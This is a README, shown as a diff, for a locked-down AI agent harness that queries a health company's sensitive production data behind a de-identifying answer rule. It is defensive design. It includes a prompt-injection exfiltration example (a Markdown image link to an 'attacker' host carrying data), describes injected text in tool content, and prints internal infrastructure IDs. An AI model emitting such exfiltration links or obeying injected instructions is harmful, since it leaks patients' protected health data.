@@ -1,0 +1,914 @@
+# Kickoff ZDR harness
+
+A dedicated, locked-down [OpenCode](https://opencode.ai) server for questions
+that need sensitive Kickoff data. It runs only on Kickoff's **zero-data-retention
+(ZDR) OpenAI key** and only exposes read-only MCP servers: **Amplitude**, **BugSnag**,
+**PostHog**, **Cloudinary**, production **Lambda logs** and its own **memory**. Claude Code and Codex never see the raw data: they call the `zdr_ask`
+MCP tool, and only the harness's final answer comes back.
+
+```
+Claude Code / Codex ──zdr_ask──▶ zdr-agent MCP (mcps/zdr-agent) ──HTTP──▶ opencode serve :4096
+                                                                         ├─▶ api.openai.com (ZDR project)
+                                                                         ├─▶ mcp.amplitude.com (OAuth)
+                                                                         ├─▶ bugsnag.mcp.smartbear.com (token)
+                                                                         ├─▶ mcp.posthog.com (token, read-only)
+                                                                         ├─▶ api.cloudinary.com (assets + config, key/secret)
+                                                                         ├─▶ logs.<region>.amazonaws.com (SigV4, read-only)
+                                                                         ├─▶ 127.0.0.1:33306 ─SSM tunnel─▶ prod read replica (kudos_ro)
+                                                                         ├─▶ kickoff-transcript-archive-production.s3 (SigV4 + KMS)
+                                                                         └─▶ slack.com/api (bot token, read-only)
+```
+
+**BAA and ZDR.** Kickoff's OpenAI account is covered by a BAA (confirmed
+2026-09-18), so PHI may reach the model here. The key is a service-account key
+(`sk-svcacct-…`) in organisation `kickoff-1`, project
+`proj_gbiv5UipYAA0QwtChV5R5CX9` — read off the `openai-organization` and
+`openai-project` response headers. Zero retention was proven separately on
+2026-09-16: a Responses call with `store: true` came back `store: false` and
+retrieval returned 404, while a control key from another org stored normally.
+
+That is why the boundary is about **where an answer goes**, not what it
+contains: OpenAI and this Mac may hold PHI; Claude Code and Codex may not.
+
+## Layout
+
+| Path | What |
+|---|---|
+| `apps/zdr-agent/opencode/opencode.json` | OpenCode config (no secrets) |
+| `apps/zdr-agent/opencode/prompts/zdr.md` | The `zdr` agent prompt, including the **answer rule** |
+| `apps/zdr-agent/bin/zdr-harness` | Wrapper: preflight checks + isolated environment |
+| `src/launchd/com.taylor.zdr-harness.plist` | Keeps `zdr-harness serve` running |
+| `src/launchd/com.taylor.zdr-harness-tunnel.plist` | Keeps the SSM tunnel to the production read replica open |
+| `mcps/zdr-agent/` | Zero-dependency MCP bridge for Claude Code / Codex (fleet service) |
+| `apps/zdr-agent/app/` + `build_app.py` | **ZDR Harness.app**: native viewer for the web UI (see [App](#app)) |
+| `apps/zdr-agent/.env` (600, gitignored) | Every harness secret: `KICKOFF_OPENAI_ZDR_API_KEY`, `ZDR_HARNESS_PASSWORD`, `KICKOFF_BUGSNAG_TOKEN`, `KICKOFF_POSTHOG_TOKEN`, `KICKOFF_CLOUDINARY_*`,
+`KICKOFF_ZDR_AWS_*`. `~/.zdr-harness/.env` is a fallback if this is absent |
+| `apps/zdr-agent/.env.template` | Same keys and comments with empty values; keep the two in sync |
+| `apps/zdr-agent/mcps/kickoff-logs/` + `kickoff-logs-mcp` | Harness-only MCP server for production Lambda logs (see [Lambda logs](#lambda-logs)) |
+| `apps/zdr-agent/mcps/cloudinary-mcp` | Launcher for Cloudinary's two official MCP servers, assets and config (see [Cloudinary](#cloudinary)) |
+| `apps/zdr-agent/mcps/kickoff-db/` + `kickoff-db-mcp` | Harness-only MCP server for the LIVE production database and archived call transcripts (see [Production database](#production-database)) |
+| `apps/zdr-agent/mcps/kickoff-slack/` + `kickoff-slack-mcp` | Harness-only MCP server for the Slack channels the Field Notes bot is in (see [Slack](#slack)) |
+| `apps/zdr-agent/mcps/classifier/` + `classifier-mcp` | Bulk text classification on the ZDR key; also registered in Claude Code, Codex and Cursor, with a separate job store there (see [`mcps/classifier/README.md`](mcps/classifier/README.md)) |
+| `apps/zdr-agent/certs/rds-global-bundle.pem` | Amazon RDS CA bundle the database connection is verified against |
+| `apps/zdr-agent/iam/` | The policy of record for the `zdr-harness-logs` AWS user |
+| `~/.zdr-harness/opt/` | Pinned OpenCode install (`opencode-ai@1.18.31`) |
+| `~/.zdr-harness/xdg/data/opencode/` | Sessions DB, MCP OAuth tokens, logs (**holds raw tool output**) |
+
+1Password (Kickoff account, Employee vault): `KICKOFF_OPENAI_API_KEY` (the ZDR
+key) and `ZDR_HARNESS_PASSWORD` (web UI / API Basic auth, username `opencode`).
+
+## How it is locked down
+
+- **Key isolation.** OpenCode runs under `env -i` with a private `HOME`, private
+  `XDG_*` dirs and only the variables listed in the wrapper. The personal
+  `OPENAI_API_KEY` that `com.taylor.mcp-tokens` puts in the launchd session never
+  reaches it. The wrapper refuses to start if the ZDR key equals that personal
+  key, or if a stored `auth.json` (which outranks env) exists.
+- **One provider, one agent.** `enabled_providers: ["openai"]` plus a
+  `provider.use` deny-all/allow-openai policy. Built-in `build`, `plan`, `general`
+  and `explore` agents are disabled; `zdr` is the default.
+- **No built-in tools, named MCP tools only.** `permission` denies `*`, then
+  allows 41 named tools: 15 Amplitude, 16 BugSnag (all annotated read-only by
+  their servers), PostHog's single `exec`, four CloudWatch Logs readers, four
+  memory tools, and `todowrite`, which only keeps a plan in the session and
+  touches nothing outside it. Tools that read PHI are allowed because the model
+  is covered by the BAA; every write tool, and the shell, file, edit, web, task
+  and skill built-ins, stay denied — those guard against a prompt-injected model
+  acting or exfiltrating, which a BAA says nothing about. Shell, file, edit, web, task and
+  skill tools, every BugSnag write tool (`update_error`,
+  `set_network_endpoint_groupings`), Amplitude user lookup
+  (`get_amp_user_data`), session replay, AI feedback and agent-analytics tools
+  are hidden from the model entirely. OpenCode names MCP tools
+  `<server>_<tool>`, so BugSnag's are `bugsnag_bugsnag_*`.
+- **PostHog is the exception to the allowlist.** Its MCP exposes one router
+  tool, `exec`, which reaches ~347 API tools, so a per-tool allowlist cannot
+  constrain it. Three server-side controls do instead: the personal API key is
+  read-scoped (a `POST /dashboards/` probe returns "API key missing required
+  scope 'dashboard:write'"), the URL carries `readonly=true`, and it is pinned
+  to `project_id=433067` (Kickoff Production). Anything that key can read,
+  including person-level rows, is reachable inside the harness; the agent's
+  answer rule and `zdr_ask`'s scrubbing are what keep it from coming back out.
+- **No vendor egress.** Sharing, auto-update, Claude Code file loading, project
+  config, default plugins, external skills, LSP downloads and the model-catalog
+  fetch are all off. Config is passed as a single file (`OPENCODE_CONFIG`)
+  because OpenCode runs a background `npm install` in every **writable** config
+  directory; the one config dir still in play (`~/.zdr-harness/xdg/config/opencode`)
+  is kept `chmod 555`, and the wrapper refuses to start if it becomes writable.
+  Never set `OPENCODE_DISABLE_EMBEDDED_WEB_UI`: it makes the server proxy the UI,
+  with credentials, to `app.opencode.ai`.
+- **Local only.** Binds `127.0.0.1:4096` with HTTP Basic auth.
+- **Pinned.** The wrapper refuses any OpenCode version other than 1.18.31, and
+  refuses if managed config exists at `/Library/Application Support/opencode`.
+- **Two answer contracts, chosen by destination.** `analyst` is the default
+  agent and answers in full: it is read by Taylor in the app, and the model is
+  BAA-covered, so de-identifying there would hide the thing being debugged.
+  `zdr` is the agent the MCP bridge always names, and its reply lands in Claude
+  Code or Codex, which are **not** covered — so that one is de-identified. The
+  bridge enforces it from both ends: it refuses to continue a session belonging
+  to another agent, and it checks which agent wrote the reply before relaying
+  it, returning a pointer to the app instead on a mismatch.
+- **The `zdr` answer rule.** The reply lands somewhere with neither zero data
+  retention nor a BAA, so the agent prompt holds it to HIPAA Safe Harbor (45 CFR 164.514(b)(2)): none of the 18
+  identifier types, nothing that singles out one person, and no grouping under
+  11 people (CMS's cell-size policy). Within that line it is deliberately
+  generous: aggregates, catalogue and schema names, object IDs and console
+  links (a BugSnag error ID names a record, not a person), device *model* names,
+  verbatim exception messages with identifiers placeholdered, and stack frames
+  down to file and line. Person-scoped codes stay out even when random
+  (`distinct_id`, device, session and replay IDs), because the agent asking can
+  open the same tools and translate them back. When something is withheld the
+  agent says which field and points at the session in the app, where the raw
+  result already is. `zdr_ask` additionally scrubs email addresses and phone
+  numbers from what it returns.
+
+**Auth per server (revised 2026-09-17).** Amplitude uses OAuth. OpenCode's MCP
+SDK (1.29, following SEP-835) requests every scope a server advertises and
+ignores a configured `oauth.scope`, and Amplitude advertises
+`mcp:read mcp:write`, so that token can write; read-only is enforced by exposing
+only named read-only tools, plus the account's Amplitude role.
+
+BugSnag and PostHog use long-lived tokens from `apps/zdr-agent/.env` instead,
+set as `headers` with `oauth: false`, so there is nothing to re-authorise in a
+browser:
+
+- **BugSnag** needs `Authorization: token <KICKOFF_BUGSNAG_TOKEN>`. Its API
+  rejects `Bearer` with `401 Bad Credentials`, which is what the OAuth path hit
+  once its hour-long access token expired; OpenCode does not refresh a token the
+  MCP server reports as bad inside a tool result, so the harness looked
+  `connected` while every BugSnag call failed. The token itself is full-access,
+  so the two write tools stay out of the allowlist.
+- **PostHog** needs `Authorization: Bearer <KICKOFF_POSTHOG_TOKEN>` and a
+  read-scoped key (see above).
+
+The tokens are never copied into config or logs: `opencode.json` references
+`{env:KICKOFF_BUGSNAG_TOKEN}` and `{env:KICKOFF_POSTHOG_TOKEN}`, and the wrapper
+names each variable explicitly when building the isolated environment.
+
+They live in `apps/zdr-agent/.env`, next to the config they belong to and
+gitignored, with `.env.template` as the tracked shape. The file header says the
+tokens are for this harness only. That is a note, not an enforcement mechanism:
+the file sits inside the dotfiles repo, so any agent working in this checkout
+can read it, and `chmod 600` only stops other users.
+
+Known gap: the permission rules constrain the model, not the HTTP API. Anyone
+with the Basic password can still reach OpenCode's shell/PTY endpoints. The
+localhost bind and a random 64-hex-char password are the control.
+
+## Everyday use
+
+From Claude Code or Codex, call `zdr_ask` with a question; pass the returned
+`session_id` for follow-ups. `zdr_sessions` lists recent sessions.
+
+```sh
+zdr-harness status     # health, MCP connection state, web UI URL
+zdr-harness attach     # TUI on the running server
+zdr-harness logs
+zdr-harness restart
+zdr-harness reload-auth          # apply edited secrets: restart + probe tokens
+zdr-harness set-token KICKOFF_POSTHOG_TOKEN   # hidden prompt, restart, re-check
+zdr-harness app                  # build if stale, install, open ZDR Harness.app
+zdr-harness prune --dry-run      # sessions not updated in 30 days
+zdr-harness prune --days 14      # delete sessions not updated in 14 days
+```
+
+Read and drive chats in **ZDR Harness.app**, not a browser tab (see [App](#app)).
+(`zdr-harness` = `~/dotfiles/apps/zdr-agent/bin/zdr-harness`.)
+
+## App
+
+`~/Applications/ZDR Harness.app` (bundle id `com.taylor.zdr-harness.app`) is a
+small Swift app (AppKit + WebKit, no dependencies, ad-hoc signed) that shows the
+server's own embedded web UI in a `WKWebView`. It exists because a browser tab
+is not safe for this data.
+
+**Why not a browser tab.** The UI's CSP is `img-src 'self' data: https: blob:;
+connect-src *`. A model answer containing `![](https://attacker/?q=<data>)`
+makes a browser fetch that URL, and Amplitude or BugSnag content can carry
+injected text asking for exactly that. The agent's answer rule refuses to emit
+image links (tested 2026-09-17), but a prompt is not a control.
+**Why not OpenCode Desktop.** It ships Sentry and starts its own server.
+
+What the app does:
+
+- **Blocks every request that is not `http://127.0.0.1:4096/`.** A
+  `WKContentRuleList` (block `.*`, then `ignore-previous-rules` for
+  `^http://127\.0\.0\.1:4096/`) is installed before the first load. It covers
+  images (including `https:`), `fetch`, CSS, fonts, beacons and WebSockets. If
+  it fails to compile, the app shows an error and never loads the UI.
+- **Terminal panel disabled.** OpenCode's PTY panel uses `ws://`, which the rule
+  list blocks. A terminal there would be a shell holding the ZDR key.
+- **Second layer**, for what a rule list cannot see: a document-start script
+  turns DNS prefetch off and removes `RTCPeerConnection`.
+- **Navigation lock.** Only the harness origin loads in the window. Any other
+  link or popup is cancelled and shows its full URL with "Open in browser" /
+  "Cancel". Downloads, file uploads, camera and microphone are denied.
+- **Signs in without a prompt.** Reads only `ZDR_HARNESS_PASSWORD` from
+  `~/.zdr-harness/.env` at launch and keeps it in memory. It answers Basic
+  challenges only from `127.0.0.1:4096`, once; every other challenge is
+  cancelled.
+- **Status and service controls.** Title-bar status (`Healthy · amplitude ✓ ·
+  bugsnag ✓`) from `/global/health` and `/mcp` every 30 s and on focus. The
+  Harness menu has Restart Service (`launchctl kickstart -k`, or `bootstrap` if
+  booted out), Open Logs Folder, Open README and Copy Web URL. If the service is
+  down the window shows Restart Service / Retry and reloads once healthy. An MCP
+  server in `needs_auth`/`failed` gets an alert with the right fix for that
+  server: `mcp auth` for Amplitude, which uses OAuth, and `reload-auth` for the
+  token-based ones, where `mcp auth` only answers "not an OAuth-capable remote
+  server".
+- **No leftovers.** HTTP caches are cleared at launch and quit. localStorage
+  keeps UI prefs, drafts and the project list under
+  `~/Library/WebKit/com.taylor.zdr-harness.app`. The web inspector is off unless
+  launched with `--debug`.
+
+Log: `~/.zdr-harness/logs/app.log` (rotated at 1 MB): launches, rule-list
+compile, blocked navigations (host and path only), health changes.
+
+**Not covered.** The status dot reflects `/mcp`, which says `connected` even
+when a server's upstream token has expired (BugSnag answers `401 Bad
+Credentials` inside tool results); re-auth fixes it. The rule list governs this
+app only: anyone with the password can still use a browser or the API. Clipboard
+contents and anything opened with "Open in browser" leave the app's control.
+
+**First run.** OpenCode 1.18.31 always uses its new layout. Home (`/`) lists
+sessions only for projects the UI knows, so once: **Add project → type
+`/Users/taylor/.zdr-harness/work` → pick it**. The UI remembers it. Session links
+look like `/<base64url of the dir>/session/<id>`; open one directly with
+`open -a "ZDR Harness" --args --session <id>`.
+
+```sh
+zdr-harness app                  # build if stale, install to ~/Applications, open
+zdr-harness app-build --force    # rebuild and install without opening
+A="$HOME/Applications/ZDR Harness.app/Contents/MacOS/ZDRHarness"
+"$A" --self-test                 # prints one JSON object, exit 0 only if all pass
+"$A" --self-test --canary-port 19471 --snapshot-dir /tmp/zdr-shots
+"$A" --self-test-recovery        # with the service booted out: placeholder, restart, reload
+"$A" --expect-env-error --env-file /nonexistent
+```
+
+`--self-test` runs the real window code off-screen and checks: rule list
+compiled; home rendered with sessions listed; in-page `fetch('/session')` 200
+(the Basic credential carries over); `EventSource('/event')` gets
+`server.connected`; `fetch`, `http:` and `https:` images and a WebSocket to a
+loopback canary on another port are blocked; foreign auth challenges are
+cancelled; the second layer is active. A throwaway web view with no rules must
+reach its own canary (positive control), so "zero requests" means something.
+With `--canary-port N` blocking is tested against your listener, whose access
+log must stay empty; with `--session <id>` it also puts Markdown-style images
+into the rendered answer.
+
+## Lambda logs
+
+`apps/zdr-agent/mcps/kickoff-logs` gives the harness read-only access to
+Kickoff's production Lambda logs in CloudWatch: `list_groups`, `list_streams`,
+`search` (FilterLogEvents) and `query` (Logs Insights). Zero dependencies, node
+stdlib only, SigV4 signed in about 40 lines, launched over stdio inside the same
+isolated environment as everything else.
+
+**Harness-only.** These logs carry request payloads, headers and client free
+text, so this server must never be registered in Claude Code, Codex or any other
+non-ZDR client. The harness is the point: raw lines stay here and the answer rule
+governs what leaves.
+
+Three walls, not one:
+
+- **The code.** Only four read APIs are implemented, so no prompt can reach a
+  mutating call regardless of what the credential allows.
+- **The server's own filter.** Group names must match
+  `/aws/lambda/(kickoff|kudos)-*-production-*`; a staging or beta group is
+  refused before AWS sees it.
+- **IAM.** The `zdr-harness-logs` user is read-only on those same groups
+  (`iam/zdr-harness-logs-policy.json`), and is not the account's admin user.
+
+Windows and result counts are capped because Insights bills per GB scanned and
+`/aws/lambda/kudos-node-production-graphql` alone holds ~500 GB: 7 day maximum
+window (1 h default), 1000 events per search (100 default), 1000 rows per query,
+90 s query timeout with `StopQuery` on overrun. Every query reports the
+bytes it scanned.
+
+Credentials are optional. Without them the harness starts normally and the tools
+answer with the exact command to fix it. Setup is in
+[`iam/README.md`](iam/README.md).
+
+## Cloudinary
+
+`apps/zdr-agent/mcps/cloudinary-mcp` launches Cloudinary's official
+`@cloudinary/asset-management-mcp`, pinned into `~/.zdr-harness/opt` like
+OpenCode itself so starting it never fetches code. Upgrade deliberately:
+
+```sh
+npm i --prefix ~/.zdr-harness/opt @cloudinary/asset-management-mcp@<version>
+```
+
+The package ships write tools (upload, rename, delete, folder moves, generative
+image tools). None of them are reachable: `opencode.json` denies `*` and then
+allows exactly nine read tools — `search-assets`, `get-asset-details`,
+`list-images`, `list-videos`, `list-files`, `list-tags`, `search-folders`,
+`visual-search-assets`, `get-tx-reference`.
+
+**The credential is the account root key** (1Password, personal account, Kickoff
+vault, `KICKOFF_CLOUDINARY_TOKEN: Root`). A scoped read key was tried first and
+rejected: it returned counts and tags but never asset rows — `resources/*` came
+back `200` with an empty array and a cursor, on every delivery type — so the
+read tools were useless. The trade is that the allowlist is now the *only* wall
+between a question and a change to the live asset library, not the second one.
+Both agent prompts say so and forbid reaching for a write. Enabling one is a
+deliberate edit here plus a restart, which is what "Taylor approved it" means.
+
+**Why it is harness-only.** Kickoff's Cloudinary account holds client progress
+photos and coach uploads. An asset's public ID, filename, folder path and
+delivery URL routinely name a person, and the URL is fetchable, so all of it is
+PHI-adjacent. The `zdr` answer rule therefore treats asset identifiers and URLs
+like any other identifier: counts, formats, sizes, tags and dates go out, the
+thing that points at a client does not. That is also why this server was removed
+from Claude Code and Codex — it belongs behind the answer rule, not in front of
+it.
+
+### Account configuration
+
+`cloudinary-mcp config` runs Cloudinary's `@cloudinary/environment-config-mcp`
+as a second server, registered as `cldconfig`. It exists because the asset tools
+cannot answer a question about how uploading is *configured*: an agent
+investigating upload preset `xrbltc4f` could see the assets it produced and
+still not tell you whether the preset was unsigned, eager, async, moderated or
+backed up.
+
+Eight read tools are allowed: `list-upload-presets`, `get-upload-preset-details`,
+`list-transformations`, `get-transformation-details`, `list-upload-mappings`,
+`list-triggers`, `list-streaming-profiles`, `get-streaming-profile`. The package's
+ten create/update/delete tools are not, and neither is `test-trigger` — it only
+evaluates a filter against sample data, but it takes an arbitrary request body
+and nothing here needs it.
+
+This surface is a good trade: it is product wiring, not client data, so unlike
+the asset tools it carries no PHI at all and the answer rule lets it through in
+full. The two things still withheld are a webhook trigger's callback URL query
+string and an upload mapping's remote template, either of which can carry a
+token.
+
+`cloudinary_get-usage-details` was allowed at the same time — account-level plan
+and usage totals, which the restricted key used to 403 on.
+
+The launcher runs both servers under an explicit `node` from `resolve-binary.sh`:
+the packaged bin is `#!/usr/bin/env node` and the harness PATH has no `node`, so
+the shebang alone cannot start it.
+
+## Slack
+
+`apps/zdr-agent/mcps/kickoff-slack` reads the channels the **ZDR Coach
+Insights** Slack app has been invited to: the dietitian channel, the RD bugs
+channel, and the ~600 per-client `<first>-<last>-support-team` channels. Four
+read tools — `channels`, `history`, `thread`, `members` — over four Web API
+methods; the app's scopes (`channels:read`, `channels:history`, `groups:read`,
+`groups:history`, `users:read`) allow nothing that writes, and `reload-auth`
+warns if a write scope ever appears on the token.
+
+**Why it is harness-only.** A support channel's name is a client's name and
+its messages are staff discussing that client's health. The bot was created
+for this harness and its purpose is written into the app's Slack profile so an
+admin auditing installed apps sees who consumes it and why. The token lives in
+`apps/zdr-agent/.env` as `KICKOFF_SLACK_ZDR_BOT_TOKEN` (1Password personal
+account, Kickoff vault, "Field Notes Slack Bot").
+
+**Access is channel membership.** A bot cannot join a private channel by
+itself; someone in each channel runs `/invite @Field Notes`. The plan
+for the 600 support channels (a one-time installer app with a member's user
+token, and inviting at channel creation going forward) is written up
+separately with the app manifest; for the pilot, a handful of manual invites.
+
+**Consent before access.** Field Notes joins a coach's channel only after the
+coach agrees. `tools/field-notes-consent` runs as the operator (Cameron in
+production) through a second, user-token app, **Field Notes Setup**: it posts
+one request, reads the coach's reaction on that message (✅ yes, ❌ no), and
+`sync` adds or removes Field Notes to match. It never reads the conversation,
+never touches any member but the Field Notes bot, and keeps a ledger of IDs
+and timestamps in `~/.zdr-harness/field-notes/consent.jsonl`. The operator
+token is read from 1Password at run time. Verified 2026-09-26: invite on ✅,
+removal on ❌, idempotent reruns, and Field Notes reading messages posted
+before it joined, so one consented invite unlocks the channel's full history.
+Plan and findings: `~/src/docs/html/slack-zdr-app-integration-workflow/`.
+
+**Reads are live.** `conversations.history` is Tier 3 (~50 calls/min), every
+read is bounded (200 messages, 1500 chars per message) and paged with
+`since`/`until`. Bot tokens cannot call `search.messages`, so cross-channel
+questions over hundreds of channels need the local cache the plan describes;
+that is a separate, explicit decision and is not built.
+
+### Slack as Taylor (`slackuser_*`)
+
+Slack's own MCP server (`https://mcp.slack.com/mcp`), signed in as Taylor
+through the sign-in-only Slack app **ZDR Harness** (`A0C714R33A8`; no bot,
+nothing installed into channels; 1Password personal → Kickoff "ZDR Harness
+Slack app"; secret in `.env` as `KICKOFF_SLACK_MCP_CLIENT_SECRET`). Its first
+job is the private channel #rd-bugs-and-feature-requests (`C0ALR9F5NQP`);
+#bugsby-beta (`C0B7MV8HHRT`, private) was added 2026-10-13 under the same
+rule. Claude Code, Codex and Cursor are told to read both channels only
+through `zdr_ask`. A new channel needs no new token: the token reads any
+channel Taylor is in, so adding one is a prompt and routing-rule change.
+
+- **Read-only at the token, not just the allowlist.** OpenCode's own sign-in
+  ignores `oauth.scope` and asks for every MCP scope, writes included, and
+  Slack grants them because the app has MCP enabled. So
+  `zdr-harness mcp auth slackuser` runs `tools/slack-mcp-auth` instead: it
+  asks for read scopes only, refuses (and revokes) any token that can write,
+  stores it in `mcp-auth.json`, and revokes the token it replaces. Scopes
+  accumulate per user and app, so dropping a write scope needs the old token
+  revoked first; the tool does that when it refuses.
+- Granted (verified 2026-10-05): channel and private-channel read, search
+  (public, private, files, users), files, canvases, lists, reactions, users.
+  No write scope and no DMs. `chat.postMessage` and `reactions.add` with the
+  stored token return `missing_scope`.
+- Allowlist: the 14 tools Slack marks read-only (`slackuser_slack_read_*`,
+  `search_*`, `list_*`, `get_reactions`); its 12 write tools stay denied.
+
+## Production database
+
+`apps/zdr-agent/mcps/kickoff-db` gives the harness read-only access to the
+**live** production database and to the archived call transcripts its rows
+point at. This is the one source in the harness that is raw PHI end to end, so
+it is also the one whose boundary is explained in the most detail.
+
+**Why it exists.** The sanitized copy (Kickoff Sanitized DB) is what every
+non-BAA agent uses, and it is deliberately a snapshot with free text removed.
+Questions about what is happening now, or about what clients and coaches
+actually say on calls, cannot be answered from it. The harness can answer them
+because its only model is BAA-covered and its answer rule de-identifies what
+leaves.
+
+**The credential is `kudos_ro`**, an existing user on the read replica
+`kickoff-production-mysql-read` (SSM parameter
+`mysql-url-production-read-encrypted`; 1Password personal account, Kickoff
+vault, `KICKOFF_ZDR_DB_URL`). Nothing was created: `SHOW GRANTS` is `USAGE` plus
+`SELECT, SHOW VIEW ON kudos_production.*`, and the replica itself is
+`read_only=1`. Verified 2026-09-24 through the tunnel: `CREATE TEMPORARY
+TABLE`, `UPDATE`, `INSERT` and `SELECT … INTO OUTFILE` all refused.
+
+**The network path.** The replica is private (VPC `vpc-38744b5f`, security group
+`sg-066924a45bc65e918`). The **Kickoff Bastion** (`i-00b905df66752344d`) is the
+one SSM-managed host whose group that security group admits, so the harness
+reaches the replica through an SSM port-forward to it — no VPN, no public
+endpoint, no inbound rule. The LaunchAgent `com.taylor.zdr-harness-tunnel`
+keeps that session open on `127.0.0.1:${KICKOFF_ZDR_DB_TUNNEL_PORT}` (33306):
+it runs `zdr-harness tunnel start --foreground`, which `exec`s the `aws ssm
+start-session` process so launchd supervises it directly, and `KeepAlive`
+reopens it when SSM ends an idle session (about 20 minutes) or the laptop
+wakes. The MCP forgets a lost socket and reconnects on its next call, so a
+drop costs one retried query, not a restart. With the agent loaded,
+`zdr-harness tunnel start|stop|status` go through launchd (`stop` unloads it);
+without it they fall back to a `nohup` child. TLS is still verified against
+the RDS CA bundle and the replica's real hostname even though the socket says
+`127.0.0.1`.
+
+**Walls, in order:**
+
+1. `kudos_ro`'s grants and the replica's `read_only`.
+2. The server: one statement per call, only `SELECT`/`WITH`/`SHOW`/`EXPLAIN`/
+   `DESCRIBE`, inside `START TRANSACTION READ ONLY` with
+   `MAX_EXECUTION_TIME=30000`; 1000 rows and 250 KB per result; 2000 chars
+   per cell; `INTO OUTFILE`, `FOR UPDATE`, `LOAD_FILE`, `SLEEP` and `BENCHMARK`
+   refused by name. Rows **stream** and stop at the cap: a statement that
+   returns more is cut off at the socket, not buffered, so `SELECT * FROM sms`
+   costs the replica a few rows rather than 30 seconds of streaming. An
+   `EXPLAIN` runs first and the result notes a planned full scan over 1M
+   rows. Every statement is logged to stderr as a 12-char hash plus its shape
+   with literals replaced by `?`, never the literals.
+3. Transcripts come only from `kickoff-transcript-archive-production`, only at
+   keys shaped `transcripts/v1/<id>/<generation>/assemblyai.json.gz`, only by
+   way of the `file_transcript_artifacts` row that names the object, and only
+   after the sha256 in that row matches the decompressed body.
+4. No transcript read limit (the 30-per-hour budget was removed on
+   2026-10-05). Agents choose how many to read; the guide and tool texts
+   teach the practice: metadata for counts, export + classifier for "what
+   share" and "which ones", a spread sample of 5-20 for themes, 3-5 per label
+   to check a classification.
+5. Retention: `zdr-harness prune` deletes sessions that used any `kickoffdb_*`
+   tool after 7 days (`--db-days`), others after 14.
+6. The answer rule. `zdr.md` names ids, rows, free text and transcript lines as
+   identifiers; the analyst sees them, the bridge never does.
+
+**Six tools:** `guide`, `list_tables`, `describe_table`, `query`,
+`transcript_list`, `transcript_get`. The archive holds ~175k canonical
+transcripts (~23 GB); `transcript_get` renders speaker turns and pages with
+`offset`.
+
+**Transcripts and the tunnel run on the v2 IAM policy** (applied 2026-09-24).
+The archive is SSE-KMS under a customer key whose policy defers to IAM, so
+`zdr-harness-logs` has `s3:GetObject(Version)` on the one prefix and
+`kms:Decrypt` on the key only via S3, plus `ssm:StartSession` on the bastion
+and the port-forward document. Verified the same day: `transcript_get` fetched
+and sha256-verified a real archive object under that key, and `zdr-harness
+tunnel start` opened the session under it with no profile or `~/.aws` files in
+reach. One implementation note: the archive stores gzip with
+`Content-Encoding: gzip`, and Node's `fetch` decompresses that transparently,
+so the server inflates only a body that still starts with the gzip magic.
+
+**Rotating `kudos_ro`.** SSM is the source of truth and the harness holds a
+copy. Rotate the password in RDS (an operator task, not the harness's), update
+`mysql-url-production-read-encrypted`, then update the 1Password item and run
+`zdr-harness set-token KICKOFF_ZDR_DB_URL`; `reload-auth` proves the new one
+through the tunnel.
+
+### Bulk transcripts for the classifier
+
+`kickoffdb_transcript_export` takes the same filters as `transcript_list` (or
+`file_transcript_ids`), downloads up to 10,000 transcripts straight to
+`~/.zdr-harness/exports/tx_<id>.jsonl` (700/600) and returns stats only,
+including how many matched in total. `kickoffdb_transcript_export_status`
+waits for a large one. The agent never reads the rows: it checks a few with
+`classifier_classify_sample` and classifies the whole file. Exports are kept
+until archived (see Exports).
+
+## Setup from scratch
+
+```sh
+ZH=~/.zdr-harness
+mkdir -p $ZH/{home,work,tmp,logs,opt,xdg/config,xdg/data,xdg/cache,xdg/state} && chmod 700 $ZH $ZH/*
+npm i --prefix $ZH/opt --no-fund --no-audit opencode-ai@1.18.31
+
+# Secrets (never echoed)
+umask 077
+# Copy apps/zdr-agent/.env.template to $ZH/.env, then fill in the four values
+# (keep the template's keys and comments; only the values differ).
+cp ~/dotfiles/apps/zdr-agent/.env.template $ZH/.env
+op read -n 'op://Employee/KICKOFF_OPENAI_API_KEY/credential' --account kudos-fit.1password.com   # KICKOFF_OPENAI_ZDR_API_KEY
+op read -n 'op://Employee/ZDR_HARNESS_PASSWORD/password' --account kudos-fit.1password.com       # ZDR_HARNESS_PASSWORD
+# KICKOFF_BUGSNAG_TOKEN: BugSnag personal auth token. KICKOFF_POSTHOG_TOKEN: read-scoped PostHog personal API key.
+chmod 600 $ZH/.env
+
+# Read-only global config dir (blocks OpenCode's background npm install)
+mkdir -p $ZH/xdg/config/opencode
+printf 'node_modules\npackage.json\npackage-lock.json\nbun.lock\n.gitignore' > $ZH/xdg/config/opencode/.gitignore
+chmod 444 $ZH/xdg/config/opencode/.gitignore && chmod 555 $ZH/xdg/config/opencode
+
+# BugSnag and PostHog read their tokens from ~/dotfiles/.env (KICKOFF_BUGSNAG_TOKEN,
+# KICKOFF_POSTHOG_TOKEN). Only Amplitude needs the one-time browser OAuth.
+~/dotfiles/apps/zdr-agent/bin/zdr-harness mcp auth amplitude
+
+# Service
+ln -sf ~/dotfiles/src/launchd/com.taylor.zdr-harness.plist ~/Library/LaunchAgents/
+launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.taylor.zdr-harness.plist
+
+# Clients
+claude mcp add zdr-agent -s user -- /Users/taylor/src/github/dotfiles/mcps/_shared/bin/run zdr-agent
+codex mcp add zdr-agent -- /Users/taylor/src/github/dotfiles/mcps/_shared/bin/run zdr-agent
+```
+
+Answers can take minutes. In `~/.codex/config.toml` set `tool_timeout_sec = 600`
+under `[mcp_servers.zdr-agent]`; for Claude Code set `MCP_TOOL_TIMEOUT=600000`.
+
+## Changing the tool allowlist
+
+OpenCode has no API that lists MCP tools, and a server can add tools at any
+time. An allowlist entry only works if its exact name exists, so check names
+against the server first. Ask the harness itself (via `zdr_ask`: "list the exact
+names of every tool you can call; do not call any tools"), or call the server's
+`tools/list` with the token in `~/.zdr-harness/xdg/data/opencode/mcp-auth.json`
+and read each tool's `readOnlyHint`. Add only tools marked read-only, then
+`zdr-harness restart`.
+
+## Re-auth
+
+Amplitude and Slack (`slackuser`) use OAuth. For Slack always use
+`zdr-harness mcp auth slackuser` (it runs the read-only `tools/slack-mcp-auth`).
+If `zdr-harness status` shows `needs_auth` or `failed` for Amplitude:
+
+```sh
+zdr-harness mcp auth amplitude && zdr-harness restart
+```
+
+For BugSnag or PostHog, `connected` is not proof: a bad token surfaces as a
+`401` inside a tool result, so check with one real question per server.
+
+### Reflowing auth after an edit
+
+`{env:...}` is resolved once, when the server starts, so editing the secrets
+file changes nothing until that process restarts. Reloading the app's web UI
+does not do it. Either of these does:
+
+```sh
+zdr-harness reload-auth      # restart, fingerprints, and probe each token's API
+```
+
